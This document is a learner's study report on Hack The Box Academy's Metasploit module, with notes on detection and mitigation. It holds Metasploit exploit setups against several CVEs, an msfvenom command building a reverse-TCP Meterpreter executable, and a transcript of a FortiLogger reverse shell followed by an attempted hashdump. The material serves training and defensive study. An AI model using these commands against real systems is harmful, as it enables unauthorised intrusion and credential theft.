# Using the Metasploit Framework — Complete Technical Study and Lab Report

**Author:** NeroPQ — NERO.SEC  
**Platform:** Hack The Box Academy  
**Module:** Using the Metasploit Framework  
**Module ID:** 39  
**Official URL:** https://academy.hackthebox.com/app/module/39  
**Difficulty:** Easy  
**Category:** Offensive Security / Exploitation / Post-Exploitation  
**Report date:** November 2026  
**Classification:** Documented Practice / Evidence Pending  
**Publication status:** Unpublished Draft

> Evidence integrity: This report covers all 15 official sections. Technical explanations and reference commands are not automatically claims of completed practical exercises. The FortiLogger exploitation sequence is supported by original terminal output supplied by the learner. Other case studies have exercise prompts and reference methodology, but not sufficient original execution evidence to verify completion. No HTB flags, password hashes, or secrets are published here.

## Overview

The Metasploit Framework is a modular penetration-testing and exploit-development platform used for vulnerability verification, security testing, exploit execution, payload handling, session management, and post-exploitation. Its primary command-line interface is MSFconsole. This report consolidates the complete learning scope of HTB Academy Module 39 into one technical study, rather than treating a single successful lab as completion of the entire module.

The report follows the module's original 15-section order. It combines architecture, operational commands, target selection, payload construction, database management, plugins, sessions, Meterpreter, module development, MSFVenom, detection considerations, and historical framework updates.

The practical case studies are Windows SMB exploitation through the MS17-010 family, Apache Druid command execution, elFinder application exploitation, local privilege escalation involving vulnerable Sudo versions, and the FortiLogger arbitrary-file-upload vulnerability. Each is discussed in its relevant section.

Only authorized training systems should be used. All example target addresses are placeholders. Actual lab network addresses have been redacted from the preserved FortiLogger transcript.

## Learning Objectives

After studying this module, the learner should be able to explain Metasploit's architecture; navigate MSFconsole; distinguish exploit, auxiliary, payload, post, encoder, and evasion modules; identify compatible targets and payloads; manage workspace data; operate session and job controls; recognize the advantages and limits of Meterpreter; understand importing Ruby modules; generate payload artifacts in a laboratory; and assess detection opportunities from a defender's perspective.

Operational competence requires more than executing a working command. It includes verifying the target version, interpreting the module's check method, validating what privileges a session actually possesses, recording failures, cleaning up authorized test artifacts, and preserving reproducible evidence.

## Environment and Evidence Boundaries

**Training platform:** Hack The Box Academy, Module 39.

**Attacking environment:** Kali Linux or HTB Pwnbox running Metasploit Framework 6-style commands.

**Observed target during the FortiLogger exercise:** A Windows-hosted FortiLogger 4.4.2.2 instance. The Metasploit output reported a vulnerable version and established Meterpreter Session 2.

**Observed payload behavior:** A reverse TCP handler was started on port 4444. Metasploit reported payload generation, successful upload, execution, stage transfer, and an open Meterpreter session.

**Unverified details:** The target's Windows edition and build, the Meterpreter process architecture, the actual security principal returned by `getuid`, a successful SAM/NTLM extraction, the complete set of completed HTB exercises, and original screenshots.

**Evidence policy:** Recorded terminal lines are treated as text evidence. They are not described as screenshots. Public flags and hashes from third-party walkthroughs are deliberately excluded.

---

## 01. Preface

### Purpose of automation in penetration testing

Automation can reduce repetitive work during asset discovery, service fingerprinting, vulnerability assessment, and exploit verification. It does not eliminate the requirement to understand protocols, attack surfaces, and expected system behavior.

The main problem with tool-driven assessments is not automation itself, but uncritical trust in automation. A module can return a positive vulnerability check while an exploitation attempt fails. Conversely, a negative check might result from a missing fingerprint, unsupported target configuration, authentication requirement, or network filtering rather than from a securely patched system.

An effective assessment starts with explicit authorization, scope, assumptions, an inventory of permitted systems, and a method for preserving reproducible evidence. Each tool invocation should answer a specific security question.

### Methodology

A disciplined sequence is:

1. Establish scope and the rules of engagement.
2. Collect service information without assuming exploitability.
3. Identify and research plausible vulnerabilities.
4. Review module documentation and expected impact.
5. Configure the correct target, payload, and network listener.
6. Execute only the authorized validation technique.
7. Independently verify the outcome and privileges.
8. Collect evidence and record unsuccessful attempts.
9. Clean up generated test artifacts where authorized.
10. Translate findings into remediation and detection guidance.

### Security significance

The ability to read and interpret results matters as much as the ability to run a tool. In a real assessment, an incorrect assumption about a successful exploit may lead to false reporting, while a destructive module may cause service disruption.

**Evidence status:** Learning Notes. No separate terminal screenshot was supplied for the Preface section.

---

## 02. Introduction to Metasploit

### Architecture

Metasploit Framework is a Ruby-based modular penetration-testing platform. Its components include a console interface, module libraries, exploit definitions, payload implementations, datastore configuration, database integration, and a range of supporting tools.

The free, open-source framework is commonly accessed through `msfconsole`. Metasploit Pro is a commercial product offering a graphical web interface and additional workflow capabilities. These interfaces should not be confused with a vulnerability scanner that automatically proves every result.

### Core components

**Exploit:** Code designed to take advantage of a specific vulnerability or unsafe behavior.

**Payload:** Code or an action executed as a consequence of successful exploitation. A payload may create a basic shell, initiate a reverse connection, or provide a Meterpreter session.

**Auxiliary module:** Functionality for scanning, enumeration, service interaction, and other operations not necessarily requiring a payload.

**Post-exploitation module:** Operations performed through an existing authorized session to assess the consequences of a compromise.

**Encoder:** A module that changes the representation of payload bytes, often to accommodate bad-character restrictions. Encoding is not cryptographic secrecy and does not guarantee antivirus evasion.

### Starting the framework

```bash
msfconsole -q
```

Once the console loads:

```text
help
version
show exploits
show auxiliary
show payloads
```

The `-q` option starts MSFconsole with reduced startup banner output. It does not modify exploit behavior.

### Practical interpretation

The module's introductory questions distinguish the commercial GUI interface from the CLI of the free framework. They establish familiarity with the software interface but do not provide evidence of a completed exploitation exercise.

**Evidence status:** Learning Notes. The questions and answers were discussed, but there is no original terminal capture for this section.

---

## 03. Introduction to MSFconsole

### The interactive command environment

MSFconsole maintains current module context, configured options, global datastore values, active sessions, and background jobs. Commands such as `search`, `use`, `info`, `show`, `set`, `unset`, `check`, and `run` are central to basic operation.

A representative workflow is:

```text
msf6 > search type:exploit name:apache
msf6 > use <module_path>
msf6 exploit(...) > info
msf6 exploit(...) > show options
msf6 exploit(...) > show targets
msf6 exploit(...) > show payloads
msf6 exploit(...) > check
```

The notation above is illustrative. A module's exact available targets, payloads, and check support depend on its implementation and installed Metasploit version.

### Datastore configuration

`set` configures a value for the selected module:

```text
set RHOSTS <AUTHORIZED_TARGET_IP>
set RPORT <SERVICE_PORT>
```

`setg` provides global settings available to later modules:

```text
setg LHOST <VPN_INTERFACE_OR_IP>
```

Because global values persist between module selections, they must be reviewed before every attempt. An inherited target address or listener setting can direct traffic toward the wrong environment.

### Information gathering

```text
search cve:2021-25646
info <module_path>
show advanced
show missing
```

Search filters narrow the module list, but a search result is not itself proof of exploitability.

### Interpretation and mistakes

A module's `check` result is a vulnerability assessment rather than a guarantee of code execution. The `run` or `exploit` operation may fail because the service is unavailable, the target version differs, a payload is incompatible, or the reverse route is incorrect.

Always document the module name, framework version, configured options, result of `check`, final execution output, and resulting security context.

**Evidence status:** Learning Notes. No standalone MSFconsole practice transcript was supplied.

---

## 04. Modules

### Module categories and operational boundaries

Metasploit separates modules according to function. This classification helps prevent the mistake of treating every module as a remote exploit.

The principal module categories are:

- `auxiliary/` for scanning, fingerprinting, and protocol interactions.
- `exploit/` for exploiting vulnerabilities and creating access.
- `payload/` for defining shellcode or post-compromise behavior.
- `post/` for operating through an existing session.
- `encoder/` for transforming payload bytes.
- `nop/` for no-operation instruction generation.
- `evasion/` for specialized payload and testing workflows.

A module may specify a platform, architecture, rank, references, disclosure information, target types, compatible payloads, and required options.

### Example: scanning a Windows SMB service

The MS17-010 auxiliary scanner can be examined as follows:

```text
search smb_ms17_010
use auxiliary/scanner/smb/smb_ms17_010
show options
set RHOSTS <AUTHORIZED_WINDOWS_TARGET>
run
```

The scanner identifies indications of an unpatched or vulnerable SMB implementation. It does not create a shell. A scanner result must be interpreted in relation to the target's actual service configuration.

### Exploit module metadata

The `info` command is an important review step. It helps identify the module's supported target and potential operational impact before execution.

```text
search type:exploit platform:windows smb
info exploit/windows/smb/ms17_010_psexec
```

Module names should be verified against the locally installed framework rather than assumed to exist in every Metasploit release.

### Defensive perspective

From a defender's point of view, scanning may produce connection attempts, protocol errors, distinctive request sequences, and application log entries. The absence of a successful payload does not mean the assessment generated no detectable artifacts.

**Evidence status:** Learning Notes. Module classifications are documented, but no module inventory screenshot was supplied.

---

## 05. Targets

### Target selection

The target is the system or application for which a vulnerability is being tested. Metasploit may also expose a `TARGET` option that selects a specific exploitation implementation, operating-system profile, or architecture.

This is different from `RHOSTS`, which identifies the destination host or hosts.

Successful targeting requires attention to the running service, port, platform, processor architecture, patch level, and vulnerability prerequisites.

### Case study: EternalRomance and MS17-010

The module includes a Windows SMB exercise involving EternalRomance. EternalRomance belongs to the collection of SMB exploitation techniques associated with MS17-010. It should not be treated as interchangeable with EternalBlue merely because both concern the same Microsoft security bulletin.

The commonly discussed Metasploit module is:

```text
exploit/windows/smb/ms17_010_psexec
```

A representative authorized workflow:

```text
search ms17_010
use exploit/windows/smb/ms17_010_psexec
show targets
show payloads
show options
set RHOSTS <AUTHORIZED_WINDOWS_TARGET>
set LHOST <VPN_INTERFACE_OR_IP>
check
```

The check should be performed before exploitation when supported. The supported exploit primitive and payload behavior depend on the module and environment.

The relevant exercise objective asks the learner to obtain access and inspect a file on the Administrator desktop. After an actual shell or Meterpreter session has been created, a Windows path can be examined using the session's file commands or a system shell:

```text
getuid
pwd
ls C:\\Users\\Administrator\\Desktop
```

An actual file result or flag value is not included because no original target session for this exercise was preserved in the available conversation.

### What must be verified

Three distinct outcomes need separate evidence: SMB vulnerability detection, successful shell establishment, and access to the specified file. A vulnerability warning does not prove Administrator-level access.

The target's Windows patch level and SMB configuration are important for assessing root cause. They cannot be inferred solely from the exercise description.

### Detection and mitigation

Restrict SMB exposure, patch affected Windows systems, disable SMBv1 when not required, and monitor unexpected SMB requests or service creation. Correlate network telemetry with Windows security and service-control events.

**Evidence status:** Evidence Pending. The EternalRomance question and suggested commands are available, but no original exploitation transcript, Administrator desktop screenshot, or file-read result was supplied.

---

## 06. Payloads

### Singles, stagers, and stages

A payload defines the action following successful exploitation.

A single payload contains the necessary functionality in one self-contained component. A staged payload separates a small initial stager from a larger stage delivered after a communication channel is established.

Naming commonly distinguishes the two:

```text
windows/x64/meterpreter_reverse_tcp
windows/x64/meterpreter/reverse_tcp
```

The underscore form represents a stageless payload; the slash form indicates a staged configuration. Actual payload availability is version-dependent.

### Reverse and bind connections

A reverse payload causes the target to initiate a connection to the listener. A bind payload waits for an inbound connection on the target. The appropriate model depends on routing, firewall rules, and authorized test conditions.

For reverse connections, `LHOST` must identify an address that the target can reach. Selecting a VPN interface works only when that interface exists and is routed appropriately.

### Case study: Apache Druid RCE

The Apache Druid exercise is associated with CVE-2021-25646, a vulnerability involving unsafe execution of JavaScript expressions under affected configurations.

To identify locally available Metasploit modules:

```text
search apache_druid
```

The exploit path should be selected from the returned module list. One implementation associated with the issue is:

```text
exploit/linux/http/apache_druid_js_exec
```

Example setup for an authorized lab:

```text
use exploit/linux/http/apache_druid_js_exec
show options
set RHOSTS <AUTHORIZED_DRUID_TARGET>
set RPORT <DISCOVERED_HTTP_PORT>
set LHOST <VPN_INTERFACE_OR_IP>
check
```

Do not assume that all Apache Druid installations use the same HTTP port. The actual port must come from service enumeration or the lab's provided configuration.

The exercise asks the learner to locate `flag.txt` after successful exploitation. For a confirmed Linux shell, a bounded file search in expected lab directories is preferable to an indiscriminate search of production filesystems.

### Interpretation

A positive vulnerability check does not demonstrate file access. The record available in this conversation contains the Druid exercise question and earlier reference guidance, but not original command output from the Druid target.

### Security implications

A vulnerable analytics service can become an entry point into a host. Application configuration, script execution permissions, network segmentation, and the runtime identity determine the scope of compromise.

**Evidence status:** Evidence Pending. No genuine Druid exploit or file-read screenshot is available.

---

## 07. Encoders

### What an encoder does

An encoder transforms a payload's byte representation while preserving its intended functionality. Historically, encoders have helped satisfy exploit constraints such as null-byte restrictions or restricted character sets.

Examples include XOR-based transformations and architecture-specific encoder modules. Encoders are not equivalent to encryption, and encoded payloads are not inherently undetectable.

### Inspecting encoders

```bash
msfvenom --list encoders
```

A locally available encoder can be reviewed through the framework's documentation or MSFVenom options. Compatibility depends on architecture, payload, and output format.

### Correct mental model

Detection engines may identify malicious behavior, runtime API usage, script execution, command lines, or network traffic independent of the encoded representation. Repeated encoding does not turn known exploit behavior into benign activity.

### Practical considerations

Before relying on an encoder, determine why it is needed. If a payload already satisfies the transport and character restrictions, additional transformations may introduce unnecessary complexity.

When documenting an encoding test, preserve the original payload specification, selected encoder, output format, observed functionality, and failure messages.

**Evidence status:** Learning Notes. No actual encoder-generation output was supplied.

---

## 08. Databases

### Metasploit database integration

Metasploit can use PostgreSQL to organize discovered hosts, services, vulnerabilities, credentials, notes, and workspace-specific findings.

Database support is useful because multi-target assessments quickly become difficult to manage through unstructured terminal histories alone.

### Initial database checks

On a configured Kali environment:

```bash
sudo systemctl status postgresql
sudo msfdb init
msfconsole -q
```

`msfdb init` is an initialization command, not something that should be repeated blindly on an existing database. Before initializing, check the current database state.

Inside MSFconsole:

```text
db_status
workspace
workspace -a module39-lab
workspace module39-lab
hosts
services
```

To review workspace and database functionality:

```text
help workspace
help db_nmap
help db_import
```

### Scan import workflow

A representative Nmap XML export is:

```bash
nmap -sV -oX lab-services.xml <AUTHORIZED_TARGET>
```

Within MSFconsole:

```text
db_import lab-services.xml
hosts
services
```

The imported service table is an inventory of observations. It does not mean each detected service is vulnerable.

### Operational safeguards

Use isolated workspaces for each lab or engagement, avoid mixing client evidence, and protect stored credential material. Clear workspace boundaries also reduce the risk of accidentally reusing a target or user from a previous exercise.

### Defensive perspective

A Metasploit database is assessment-side evidence storage. Its contents may include sensitive network topology and discovered credentials, so database files and exports require access control and retention policies.

**Evidence status:** Learning Notes. The conversation does not include an original `db_status`, workspace listing, or imported scan.

---

## 09. Plugins & Mixins

### Metasploit plugins

Plugins extend MSFconsole with additional commands or integrations. They are distinct from exploit modules because they typically extend framework functionality rather than targeting a vulnerability directly.

The console provides commands to load, unload, and inspect installed plugins.

```text
help load
load <AVAILABLE_PLUGIN_NAME>
help
unload <AVAILABLE_PLUGIN_NAME>
```

The plugin name must be confirmed from the local installation. Loading arbitrary third-party Ruby code is a software supply-chain risk.

### Mixins

Metasploit is written primarily in Ruby. Mixins allow module developers to share reusable functionality through included Ruby modules rather than duplicating code.

For example, HTTP clients, TCP connection logic, file handling, or target-specific behavior can be provided through framework libraries and mixed into exploit classes.

### Why the distinction matters

A plugin changes the operator's console environment. A mixin helps a developer build reusable modules. Neither is proof that a system is vulnerable, and neither should be confused with a payload.

### Security and reliability

Extensions should be reviewed for source authenticity, version compatibility, side effects, and dependencies before installation. A third-party plugin may have visibility into sensitive assessment data and network connections.

**Evidence status:** Learning Notes. No plugin load output or custom mixin code was supplied.

---

## 10. Sessions & Jobs

### Session management

A session is an active communication channel to a target, such as a command shell or Meterpreter. A job is a background Metasploit task, such as a handler or long-running scanner.

Useful commands:

```text
sessions -l
sessions -i <SESSION_ID>
jobs -l
jobs -k <JOB_ID>
```

Within Meterpreter, `background` returns control to MSFconsole without intentionally closing the session.

A background session is not durable persistence. It may be lost when a process terminates, a connection fails, or the lab instance shuts down.

### Case study: elFinder

The exercise asks the learner to identify a web application by reviewing its HTML source, obtain a shell, and determine the user context.

The application identified in the discussed exercise is elFinder, a web-based file manager. Metasploit includes an elFinder archive command-injection exploit associated with vulnerable deployments.

Representative module discovery:

```text
search elfinder
use exploit/linux/http/elfinder_archive_cmd_injection
show options
set RHOSTS <AUTHORIZED_ELFINDER_TARGET>
set LHOST <VPN_INTERFACE_OR_IP>
check
```

After a session is actually established:

```text
getuid
```

Reference walkthroughs for this exercise report the `www-data` service identity. That value is contextual information, not a verified observation from the learner's original session.

The exact application version, request path, and exploit success must be recorded before this case can be classified as verified.

### Local privilege escalation: Baron Samedit

The associated exercise proceeds from a low-privileged Linux session to a vulnerable version of Sudo. CVE-2021-3156 is a heap-based buffer overflow known as Baron Samedit.

In a controlled lab, the relevant Metasploit local exploit can be inspected:

```text
background
search sudo_baron_samedit
use exploit/linux/local/sudo_baron_samedit
show options
set SESSION <EXISTING_LINUX_SESSION_ID>
check
```

Whether a local exploit succeeds depends on supported Sudo versions, operating-system libraries, architecture, patch state, and exploit prerequisites.

If a new elevated session is created, verify the identity independently before claiming root privileges:

```text
getuid
```

Only after successful privilege verification would access to `/root/flag.txt` establish completion of that exercise. The conversation does not contain original output demonstrating that access.

### Session versus privilege

An interactive shell may operate as a service account rather than root. A subsequent privileged session must be separately verified. The presence of multiple sessions is not, by itself, evidence of privilege escalation.

### Defensive implications

Monitor unexpected application subprocesses, shell spawning from web-service accounts, Sudo version exposure, unusual local process behavior, and privilege changes. Patch vulnerable packages and minimize service-user permissions.

**Evidence status:** Evidence Pending. elFinder and Sudo exercise questions and reference approaches are available; original shell, escalation, and flag evidence are not.

---

## 11. Meterpreter

### Purpose and capabilities

Meterpreter is a Metasploit payload that provides an interactive post-exploitation environment. Depending on the selected implementation and target, it can inspect process identity, list files, manage processes, gather system information, and load additional extensions.

It is important to separate the existence of a Meterpreter session from the session's privilege level. A working session does not necessarily have Administrator or SYSTEM permissions.

### Common commands

```text
getuid
sysinfo
getpid
getprivs
pwd
ls
```

The availability and effects of individual commands depend on the current platform, payload architecture, extensions, and security context.

### FortiLogger practical case

The exercise requires exploitation of a FortiLogger service and recovery of an NTLM password hash for a designated training account.

The selected module was:

```text
exploit/windows/http/fortilogger_arbitrary_fileupload
```

This is an arbitrary-file-upload attack surface associated with CVE-2021-3378. The module delivers code through a vulnerable application workflow. A successful payload upload is a separate event from actual payload execution.

### Observed execution

The following is a redacted excerpt from original user-supplied terminal output. Network addresses have been replaced with placeholders, but the status messages, target version, session ID, and error are preserved.

```text
[msf] exploit(windows/http/fortilogger_arbitrary_fileupload) >> run

[*] Started reverse TCP handler on [ATTACKER_VPN_IP]:4444
[*] Running automatic check
[+] The target is vulnerable. FortiLogger version 4.4.2.2
[+] Generate Payload
[+] Payload has been uploaded
[*] Executing payload...
[*] Sending stage (190534 bytes) to [LAB_TARGET_IP]
[*] Meterpreter session 2 opened
    ([ATTACKER_VPN_IP]:4444 -> [LAB_TARGET_IP]:49687)

(Meterpreter 2)(C:\Windows\system32) > hashdump
[-] priv_passwd_get_sam_hashes:
    Operation failed: Incorrect function.
```

### Interpretation of the observed output

The automatic check reported that the target was vulnerable and identified FortiLogger version 4.4.2.2. This is useful evidence of service fingerprinting and vulnerability detection.

The message `Payload has been uploaded` confirms the module reported a successful upload. The subsequent stage transfer and opened Meterpreter session establish that the exploitation process progressed beyond upload and created an interactive connection.

The prompt shows a working directory under `C:\Windows\system32`. The working directory does not identify the active security principal.

A session ID of 2 was assigned by Metasploit. This number is a local identifier, not a privilege level, vulnerability identifier, or user account.

### Post-exploitation failure

The operator attempted:

```text
hashdump
```

The command returned:

```text
priv_passwd_get_sam_hashes:
Operation failed: Incorrect function.
```

This is an actual failed post-exploitation action. It does not demonstrate successful retrieval of the SAM database or any NTLM hash.

Possible diagnostic categories include session architecture, privileges, token context, target OS behavior, extension compatibility, and the method used to access the SAM. The supplied transcript does not isolate which condition caused the failure.

The following commands were recommended for diagnosis, but their output was not subsequently supplied:

```text
getuid
sysinfo
getprivs
```

The conversation also discussed the Meterpreter Kiwi extension and its SAM-related capabilities. However, no successful `lsa_dump_sam` output was provided, so the report does not claim that recovery through Kiwi worked.

### Verification boundaries

**Verified:** Vulnerability reported, version 4.4.2.2 reported, payload uploaded, stage transferred, Meterpreter Session 2 opened, and `hashdump` failed.

**Not verified:** Session identity as `NT AUTHORITY\SYSTEM`, successful SAM extraction, recovery of the requested account hash, session migration, or official completion of the exercise.

A previously supplied hash value originated from a reference answer rather than an observed dump. It is intentionally omitted from this report.

### Forensic relevance

Defenders investigating a similar event should correlate FortiLogger web requests, unexpected file creation, application-worker activity, process execution, and outbound connections. Windows process creation and network telemetry may help reconstruct the period between upload and reverse-session establishment.

A failed credential-dumping command can still generate process or access telemetry. Failure to retrieve a secret does not imply the attempted action was invisible.

### Lessons from the case

The most important outcome is the distinction between an established command-and-control session and a successful credential-extraction operation. A strong technical report records both success and failure rather than presenting only the final objective.

**Evidence status:** Verified Exploit Execution / Failed Credential Dump / Screenshot Evidence Pending.

---

## 12. Writing & Importing Modules

### Module development model

Metasploit modules are commonly written in Ruby and inherit framework functionality through classes and mixins. The framework provides helpers for connection handling, payload compatibility, options, logging, and reporting.

Developing a module requires understanding the vulnerability and creating a repeatable test with appropriate checks and cleanup.

### Local module structure

A private Metasploit installation commonly supports custom module paths beneath the user's Metasploit directory:

```text
~/.msf4/modules/
```

For example:

```bash
mkdir -p ~/.msf4/modules/auxiliary/scanner/http
```

An auxiliary module belongs beneath the matching module category. The directory path does not make the Ruby code trustworthy.

### Importing a custom module

Once an authorized and reviewed module has been placed in its appropriate directory, MSFconsole can refresh its module inventory:

```text
reload_all
search <CUSTOM_MODULE_NAME>
info <CUSTOM_MODULE_PATH>
```

A module that loads successfully may still have implementation problems. It should be tested against a controlled service before use in a production assessment.

### Development quality

A reliable custom module should define relevant metadata, validate required options, handle timeouts, minimize side effects, report results honestly, and include a check method when appropriate.

Error handling is essential because an unexpected HTTP response or unavailable port should not automatically be interpreted as successful exploitation.

### Review and testing

Use Ruby syntax checks and framework-supported testing before importing external code. Review network destinations, file-writing behavior, system commands, and payload handling. Maintain source control for modifications and capture regression-test output.

**Evidence status:** Learning Notes. No original custom module source or successful import transcript is available.

---

## 13. Introduction to MSFVenom

### Purpose

MSFVenom is the Metasploit Framework utility for generating and formatting payloads. It can enumerate payload types, supported formats, encoders, and architecture-specific options.

The output artifact may be raw bytes, a script, or a platform-specific executable format. Generating an artifact does not prove that it will run successfully on a target.

### Enumerating capabilities

```bash
msfvenom --help
msfvenom --list payloads
msfvenom --list formats
msfvenom --list encoders
```

### Controlled example: generating a laboratory payload

A representative command for an isolated Windows training environment is:

```bash
msfvenom \
  -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<AUTHORIZED_LAB_LISTENER_IP> \
  LPORT=4444 \
  -f exe \
  -o lab-meterpreter.exe
```

This command is illustrative, not evidence that the learner generated or executed that file. Payload generation should be limited to authorized, isolated systems.

### Configuring a handler

The Metasploit multi-handler can accept connections from compatible payloads:

```text
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <AUTHORIZED_LAB_LISTENER_IP>
set LPORT 4444
show options
```

The payload, listener address, and listener port must agree with the generated artifact. A handler waiting for connections does not prove that the artifact executed.

### Staged payload considerations

A staged payload may require a second transfer to deliver the stage. Network interruptions, incompatible architecture, endpoint security controls, or routing issues may prevent a connection from becoming a functioning session.

### Operational safeguards

Do not publish working payload binaries as casual website downloads. Preserve build commands and hashes only when appropriate for authorized research, and inspect generated artifacts using isolated test systems.

**Evidence status:** Learning Notes. No locally generated payload file, checksum, or handler screenshot was supplied.

---

## 14. Firewall and IDS/IPS Evasion

### Defensive control layers

Firewalls filter traffic based on policy and observed network characteristics. Intrusion detection systems raise alerts on suspicious events, while intrusion prevention systems may actively block matching traffic.

Endpoint detection and response tools also examine process trees, file operations, script interpreters, memory behavior, and credential access. These control categories overlap but are not equivalent.

### Why a payload may fail

A Metasploit module may report successful exploitation without opening a session because the reverse connection is filtered, routing is wrong, the payload process exits, a stage transfer fails, or endpoint security interrupts execution.

The right first step is diagnosis rather than assuming that every failure requires an evasion technique.

### Network troubleshooting methodology

For an authorized lab, review the listener, the target's reachable network, expected ports, service responses, and relevant firewall logs.

```bash
ip -br addr
ip route
ss -lnt
```

These commands help validate local network interfaces, routes, and listening sockets. They do not demonstrate an IDS/IPS bypass.

### Detection-oriented laboratory design

A controlled evaluation can compare telemetry from routine service requests against telemetry generated by an authorized exploit attempt. Record packet metadata, source and destination endpoints, process creation, request timestamps, and response codes.

Differences between network alerts and host alerts can help identify monitoring blind spots. Even if a payload's bytes are encoded, defenders may still detect the underlying system behavior.

### Mitigation guidance

Prioritize patching, application hardening, least privilege, service isolation, outbound connection restrictions, and correlated logging. Signature updates alone cannot replace correcting the vulnerable application or unsafe configuration.

### Reporting principles

A report should distinguish blocked traffic, terminated payloads, unsuccessful handlers, and actual detection alerts. Without telemetry, it is not appropriate to claim that defensive controls were bypassed.

**Evidence status:** Learning Notes. No original firewall, IDS, IPS, or EDR telemetry was supplied for this section.

---

## 15. Metasploit-Framework Updates – August 2020

### Historical context

The final section discusses updates to Metasploit Framework from August 2020. It is a historical learning topic rather than a statement about the latest release.

Framework development changes affect available modules, supporting libraries, payload behavior, bug fixes, protocol support, and module compatibility. A command shown in historical course material may need review when executed on a newer release.

### Version-aware testing

The installed framework version can be checked from MSFconsole:

```text
version
```

For current documentation, use the official Metasploit project resources and repository history instead of assuming that a release from 2020 accurately describes the current environment.

### Reproducibility

A good technical report records the framework version, relevant module path, payload, target version, execution time, and observed output. These details help reviewers understand discrepancies between older demonstrations and modern installations.

Changing framework versions can alter a module's validation logic, payload compatibility, output messages, or reliability. Historical and current tool behavior must not be merged without testing.

### Lessons

The long-term lesson is to treat Metasploit as maintained software rather than a fixed collection of commands. Reviewing changelogs and module metadata is part of maintaining reliable and defensible assessment results.

**Evidence status:** Learning Notes. No local comparison between historical and current Metasploit versions was supplied.

---

## Consolidated Results and Verification

This report covers 15 of 15 official module sections as technical learning content.

The strongest firsthand practical evidence concerns FortiLogger. A vulnerable service version was reported, the payload was uploaded, a stage was transferred, and Meterpreter Session 2 was established. This supports the conclusion that the exploitation attempt established an interactive session.

The credential-dumping objective remained unverified because `hashdump` returned `Incorrect function`, and no later successful SAM retrieval was supplied.

EternalRomance, Apache Druid, elFinder, and Sudo Baron Samedit were discussed through exercise prompts and reference commands. Their practical success on the learner's targets is not substantiated by original execution logs in the accessible record.

Coverage of all sections does not automatically constitute official completion of the HTB Academy module or its Skills Assessment.

## Troubleshooting Summary

### Meterpreter session opens but post-exploitation fails

The FortiLogger transcript illustrates the difference between successful access and unsuccessful credential collection. A diagnostic sequence should verify session identity, operating-system characteristics, process architecture, available privileges, and the exact command failure before evaluating alternate techniques.

### A vulnerability check succeeds but the exploit fails

Possible causes include payload mismatch, a wrong listener address, target-specific prerequisites, service instability, and endpoint controls. Record both `check` and `run` outputs rather than reporting the check result as code execution.

### An expected module is missing

Verify the installed framework version, module naming, category, and repository documentation. A module path referenced in an older course may have changed. Search the local inventory rather than blindly pasting a historical path.

### A local privilege escalation module fails

A vulnerability identifier alone does not guarantee an exploit will work. Confirm operating-system versions, library dependencies, supported target configurations, session architecture, and the initial user context.

### A generated payload never connects

Validate local listener configuration, routing, transport selection, and platform compatibility. A successful MSFVenom command does not prove execution or a successful reverse connection.

## Security Implications

The case studies demonstrate different stages of an attack chain: network exposure, vulnerable services, application-level code execution, remote shell access, local privilege escalation, and post-exploitation operations.

The FortiLogger observation shows how unsafe file handling can lead to executable code being delivered through an exposed web application. The session's subsequent credential-dumping attempt illustrates a potential post-compromise objective even though the extraction failed.

Risk must be evaluated against the affected system's permissions, network position, accessible data, and monitoring controls. A working shell may have limited privileges, but still provide meaningful access to application files or internal connections.

## Defensive Perspective and SOC Relevance

A defender can correlate exploitation attempts across network, application, and host telemetry. Relevant sources include web access logs, application audit logs, Windows process creation events, service installation records, Linux process logs, Sudo package inventories, firewall events, and endpoint alerts.

For the FortiLogger sequence, the strongest investigative lead is the relationship between an HTTP upload request, the creation or execution of an unexpected artifact, and a new outbound connection. Those events should be analyzed together using timestamps and process relationships rather than in isolation.

For SMB exploitation, exposed legacy protocols and missing patches deserve priority. For web application exploits, file-upload restrictions, safe server configuration, process isolation, and timely updates reduce risk. For local privilege escalation, patch hygiene and least privilege limit the consequences of compromised service users.

A SOC analyst should preserve negative evidence as well. For example, an attempted SAM dump that fails may still produce useful alerts or reveal weaknesses in visibility.

## Evidence Manifest and Outstanding Work

The following screenshots are required before the practical report can be considered publication-ready:

1. MSFconsole version and selected module context.
2. EternalRomance target verification and actual session result.
3. Apache Druid service discovery, exploitation, and file access.
4. elFinder discovery and the actual shell identity.
5. Sudo version verification, local escalation, and privilege confirmation.
6. FortiLogger vulnerability check and successful Meterpreter session.
7. FortiLogger `hashdump` failure and any later diagnostic or successful result.
8. MSFVenom output, module import, database, or defense testing evidence if those practical sections are claimed as completed.

No original screenshots have been authenticated for this specific module in the currently accessible conversation. The FortiLogger terminal transcript is valid text evidence, not image evidence.

The report remains an unpublished draft until evidence and platform-publication requirements have been reviewed.

## Lessons Learned

Metasploit is most effective when combined with manual understanding, accurate target selection, disciplined session handling, and independent result verification.

The module illustrates that vulnerability detection, payload upload, shell establishment, administrative access, and credential extraction are separate milestones. Each milestone needs distinct evidence.

The FortiLogger case particularly reinforces failure analysis: a working Meterpreter session does not guarantee that `hashdump` will succeed, and a failed post-exploitation command must not be reported as a completed objective.

Finally, portfolio documentation should separate reference workflows from firsthand practice. This maintains technical credibility and makes the resulting report useful to both offensive-security practitioners and defenders.

## References

- Hack The Box Academy, Using the Metasploit Framework: https://academy.hackthebox.com/app/module/39
- HTB course overview: https://academy.hackthebox.com/course/preview/using-the-metasploit-framework
- Metasploit documentation: https://docs.metasploit.com/
- Rapid7 Metasploit Framework overview: https://docs.rapid7.com/metasploit/msf-overview/
- Metasploit module usage: https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
- Metasploit Framework source repository: https://github.com/rapid7/metasploit-framework
- CVE-2021-25646, Apache Druid: https://nvd.nist.gov/vuln/detail/CVE-2021-25646
- CVE-2021-3156, Sudo Baron Samedit: https://nvd.nist.gov/vuln/detail/CVE-2021-3156
- CVE-2021-3378, FortiLogger: https://nvd.nist.gov/vuln/detail/CVE-2021-3378
- MS17-010 security bulletin: https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010

**Final classification:** DOCUMENTED PRACTICE / EVIDENCE PENDING.  
**Official module completion:** Not independently verified.  
**Publication:** Unpublished Draft.  
**Last content review:** November 2026.
